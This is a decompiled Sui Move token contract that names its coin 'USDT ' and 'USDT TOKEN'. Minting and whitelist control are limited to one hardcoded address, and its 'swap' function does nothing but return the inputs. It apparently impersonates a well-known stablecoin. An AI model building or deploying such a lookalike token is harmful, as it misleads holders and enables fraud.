module 0x8d2ee3bbe05e663e7499448b6f7abe1e64a167c4b67a5fbc197b27e2ccdbc930::TOKEN {
    struct TOKEN has drop {
        dummy_field: bool,
    }

    struct Whitelist has store, key {
        id: 0x2::object::UID,
        addresses: vector<address>,
    }

    public fun swap(arg0: &Whitelist, arg1: 0x2::coin::Coin<TOKEN>, arg2: 0x2::coin::Coin<TOKEN>, arg3: &mut 0x2::tx_context::TxContext) : (0x2::coin::Coin<TOKEN>, 0x2::coin::Coin<TOKEN>) {
        assert!(is_whitelisted(arg0, 0x2::tx_context::sender(arg3)), 1002);
        (arg1, arg2)
    }

    public fun burn(arg0: &mut 0x2::coin::TreasuryCap<TOKEN>, arg1: 0x2::coin::Coin<TOKEN>) {
        0x2::coin::burn<TOKEN>(arg0, arg1);
    }

    public fun mint(arg0: &mut 0x2::coin::TreasuryCap<TOKEN>, arg1: u64, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        assert!(0x2::tx_context::sender(arg3) == @0x1c1652d317b98320267e874443fa1a189939710e62030188ddb120ab311dffc9, 1001);
        0x2::transfer::public_transfer<0x2::coin::Coin<TOKEN>>(0x2::coin::mint<TOKEN>(arg0, arg1, arg3), arg2);
    }

    public fun add_to_whitelist(arg0: &mut Whitelist, arg1: address, arg2: &mut 0x2::tx_context::TxContext) {
        assert!(0x2::tx_context::sender(arg2) == @0x1c1652d317b98320267e874443fa1a189939710e62030188ddb120ab311dffc9, 1001);
        0x1::vector::push_back<address>(&mut arg0.addresses, arg1);
    }

    fun init(arg0: TOKEN, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1) = 0x2::coin::create_currency<TOKEN>(arg0, 9, b"USDT ", b"USDT ", b"USDT TOKEN", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://i.postimg.cc/j5MgD9LH/icon.png")), arg1);
        let v2 = Whitelist{
            id        : 0x2::object::new(arg1),
            addresses : 0x1::vector::empty<address>(),
        };
        0x2::transfer::public_transfer<Whitelist>(v2, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<TOKEN>>(v1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<TOKEN>>(v0, 0x2::tx_context::sender(arg1));
    }

    public fun is_whitelisted(arg0: &Whitelist, arg1: address) : bool {
        0x1::vector::contains<address>(&arg0.addresses, &arg1)
    }

    public fun remove_from_whitelist(arg0: &mut Whitelist, arg1: address, arg2: &mut 0x2::tx_context::TxContext) {
        assert!(0x2::tx_context::sender(arg2) == @0x1c1652d317b98320267e874443fa1a189939710e62030188ddb120ab311dffc9, 1001);
        let (v0, v1) = 0x1::vector::index_of<address>(&arg0.addresses, &arg1);
        assert!(v0, 1002);
        0x1::vector::remove<address>(&mut arg0.addresses, v1);
    }

    public fun transfer_with_whitelist(arg0: &Whitelist, arg1: 0x2::coin::Coin<TOKEN>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        assert!(is_whitelisted(arg0, 0x2::tx_context::sender(arg3)), 1002);
        0x2::transfer::public_transfer<0x2::coin::Coin<TOKEN>>(arg1, arg2);
    }

    // decompiled from Move bytecode v6
}

